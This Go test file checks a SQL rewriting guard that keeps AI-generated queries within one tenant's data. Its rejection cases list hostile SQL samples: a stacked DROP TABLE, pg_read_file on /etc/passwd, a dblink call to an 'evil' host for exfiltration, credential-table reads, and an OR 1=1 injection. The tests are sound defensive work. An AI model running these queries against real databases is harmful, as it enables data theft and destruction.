package livisql

import (
	"errors"
	"strings"
	"testing"
)

func codeOf(t *testing.T, err error) RejectionCode {
	t.Helper()
	var re *RejectionError
	if !errors.As(err, &re) {
		t.Fatalf("expected *RejectionError, got %T: %v", err, err)
	}
	return re.Code
}

// The queries a guard must refuse. Each one is an escape route: if any of these
// starts passing, tenant isolation is broken.
func TestRewriteRejects(t *testing.T) {
	g := New(CatalogFor(RoleMember))

	cases := []struct {
		name string
		sql  string
		want RejectionCode
	}{
		{"schema qualified reaches the real table",
			`SELECT count(*) FROM public.reviews`, CodeQualifiedName},
		{"pg_catalog probing",
			`SELECT relname FROM pg_catalog.pg_class`, CodeQualifiedName},
		{"FROM ONLY skips the CTE",
			`SELECT count(*) FROM ONLY reviews`, CodeOnlyModifier},
		{"CTE shadows our shadow",
			`WITH reviews AS (SELECT * FROM orgs) SELECT count(*) FROM reviews`, CodeCTEShadow},
		{"stacked statement",
			`SELECT 1; DROP TABLE reviews`, CodeMultiStatement},
		{"update is not a select",
			`UPDATE reviews SET status = 'x'`, CodeNotSelect},
		{"insert is not a select",
			`INSERT INTO reviews (repository) VALUES ('x')`, CodeNotSelect},
		{"delete is not a select",
			`DELETE FROM reviews`, CodeNotSelect},
		{"unknown table",
			`SELECT * FROM api_keys`, CodeUnknownTable},
		{"auth token table",
			`SELECT * FROM auth_tokens`, CodeUnknownTable},
		{"file read function",
			`SELECT pg_read_file('/etc/passwd')`, CodeUnknownFunc},
		{"sleep function",
			`SELECT pg_sleep(60)`, CodeUnknownFunc},
		{"dblink exfiltration",
			`SELECT dblink('host=evil', 'SELECT 1')`, CodeUnknownFunc},
		{"current_setting leaks config",
			`SELECT current_setting('is_superuser')`, CodeUnknownFunc},
		{"qualified function bypasses the name check",
			`SELECT pg_catalog.pg_read_file('/etc/passwd')`, CodeUnknownFunc},
		{"disallowed function hidden inside a FILTER clause",
			`SELECT count(*) FILTER (WHERE pg_sleep(1) IS NULL) FROM reviews`, CodeUnknownFunc},
		{"disallowed function hidden inside a window OVER clause",
			`SELECT lag(pg_read_file('/etc/passwd')) OVER (ORDER BY id) FROM reviews`, CodeUnknownFunc},
		{"disallowed function hidden inside a subquery",
			`SELECT count(*) FROM (SELECT pg_sleep(1) FROM reviews) t`, CodeUnknownFunc},
		{"recursive cte",
			`WITH RECURSIVE t AS (SELECT 1 AS n UNION ALL SELECT n+1 FROM t WHERE n < 5) SELECT * FROM t`, CodeRecursiveCTE},
		{"locking clause",
			`SELECT * FROM reviews FOR UPDATE`, CodeLocking},
		{"bind parameter would displace the org id",
			`SELECT count(*) FROM reviews WHERE org_id = $1`, CodePlaceholder},
		{"billing table is owner-only",
			`SELECT sum(billable_loc) FROM loc_usage_ledger`, CodeUnknownTable},
		{"billing state is owner-only",
			`SELECT loc_used_month FROM org_billing_state`, CodeUnknownTable},
		{"empty query",
			`   `, CodeUnparseable},
		{"garbage",
			`not sql at all`, CodeUnparseable},
		{"oversized query",
			`SELECT ` + strings.Repeat("1,", 5000) + `1`, CodeTooLong},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, err := g.Rewrite(tc.sql)
			if err == nil {
				t.Fatalf("expected rejection, query was accepted and rewritten to:\n%s", out)
			}
			if got := codeOf(t, err); got != tc.want {
				t.Fatalf("wrong rejection code: got %s want %s (%v)", got, tc.want, err)
			}
		})
	}
}

// Queries that must survive the guard: the ones Livi actually needs to answer
// CTO questions. A guard that rejects these is useless even if it is safe.
func TestRewriteAccepts(t *testing.T) {
	g := New(CatalogFor(RoleMember))

	cases := []struct {
		name string
		sql  string
	}{
		{"reviews per month",
			`SELECT date_trunc('month', created_at) AS month, count(*) AS review_count
			 FROM reviews WHERE status = 'completed' GROUP BY 1 ORDER BY 1`},
		{"top reviewers",
			`SELECT author_username, count(*) AS n FROM reviews GROUP BY 1 ORDER BY 2 DESC`},
		{"aggregate filter",
			`SELECT count(*) FILTER (WHERE status = 'completed') AS done FROM reviews`},
		{"window function percentage change",
			`WITH monthly AS (SELECT date_trunc('month', created_at) AS m, count(*) AS n FROM reviews GROUP BY 1)
			 SELECT m, n, round(100.0 * (n - lag(n) OVER (ORDER BY m)) / NULLIF(lag(n) OVER (ORDER BY m), 0), 2) AS pct
			 FROM monthly ORDER BY m`},
		{"join across two scoped tables",
			`SELECT u.email, count(*) AS n FROM reviews r JOIN users u ON u.email = r.user_email GROUP BY 1`},
		{"cast and extract",
			`SELECT extract(dow FROM created_at)::int AS dow, count(*) AS n FROM reviews GROUP BY 1`},
		{"count wrapped in a subquery, as the plan prompt teaches",
			`SELECT count(*) AS n FROM (SELECT date_trunc('month', created_at) FROM reviews GROUP BY 1) t`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, err := g.Rewrite(tc.sql)
			if err != nil {
				t.Fatalf("unexpected rejection: %v", err)
			}
			if !strings.Contains(out, "$1") {
				t.Fatal("rewrite lost the org placeholder")
			}
			if !strings.Contains(out, "NOT MATERIALIZED") {
				t.Fatal("rewrite lost the shadow CTEs")
			}
			if !strings.Contains(out, resultAlias) {
				t.Fatal("rewrite lost the wrapper subquery")
			}
		})
	}
}

// The org filter must be structural: an injected OR cannot widen it, because it
// only ever applies inside an already-scoped relation.
func TestRewriteNeutralizesOrInjection(t *testing.T) {
	g := New(CatalogFor(RoleMember))
	out, err := g.Rewrite(`SELECT count(*) FROM reviews WHERE org_id = 3 OR 1=1`)
	if err != nil {
		t.Fatalf("query should be accepted and neutralized, not rejected: %v", err)
	}
	if !strings.Contains(out, "WHERE org_id = $1") {
		t.Fatalf("shadow filter missing from rewrite:\n%s", out)
	}
	// The model's predicate survives, but only inside the scoped CTE.
	if !strings.Contains(out, resultAlias) {
		t.Fatalf("wrapper missing:\n%s", out)
	}
}

// Role gating: billing tables appear for owners and vanish for members.
func TestCatalogRoleGating(t *testing.T) {
	member := CatalogFor(RoleMember)
	owner := CatalogFor(RoleOwner)

	if member.Allows("loc_usage_ledger") {
		t.Fatal("member must not see loc_usage_ledger")
	}
	if !owner.Allows("loc_usage_ledger") {
		t.Fatal("owner must see loc_usage_ledger")
	}
	if !member.Allows("reviews") || !owner.Allows("reviews") {
		t.Fatal("both roles must see reviews")
	}

	if _, err := New(owner).Rewrite(`SELECT sum(billable_loc) AS loc FROM loc_usage_ledger`); err != nil {
		t.Fatalf("owner billing query should be accepted: %v", err)
	}

	// An unknown role must not be treated as privileged.
	if CatalogFor(Role("nonsense")).Allows("loc_usage_ledger") {
		t.Fatal("unknown role fell back to owner visibility")
	}
}

// The users shadow must not project credentials. This asserts the column is
// absent from the rewrite; the companion DB test proves Postgres then rejects
// the reference.
func TestUsersShadowWithholdsSecrets(t *testing.T) {
	g := New(CatalogFor(RoleMember))
	out, err := g.Rewrite(`SELECT email FROM users`)
	if err != nil {
		t.Fatalf("unexpected rejection: %v", err)
	}
	for _, secret := range []string{"password_hash", "onboarding_api_key", "password_reset_required"} {
		if strings.Contains(out, secret) {
			t.Fatalf("users shadow projects %q:\n%s", secret, out)
		}
	}
	// And it must be scoped through membership, since users has no org_id.
	if !strings.Contains(out, "ur.org_id = $1") {
		t.Fatalf("users shadow is not scoped through user_roles:\n%s", out)
	}
}

// A CTE the model defines itself is legitimate and must resolve even though the
// guard collects CTE names in a separate pass from the reference check.
func TestOwnCTEResolvesRegardlessOfWalkOrder(t *testing.T) {
	g := New(CatalogFor(RoleMember))
	for i := 0; i < 50; i++ {
		if _, err := g.Rewrite(
			`WITH per_month AS (SELECT date_trunc('month', created_at) AS m FROM reviews)
			 SELECT m, count(*) FROM per_month GROUP BY 1`); err != nil {
			t.Fatalf("iteration %d: own CTE was rejected: %v", i, err)
		}
	}
}
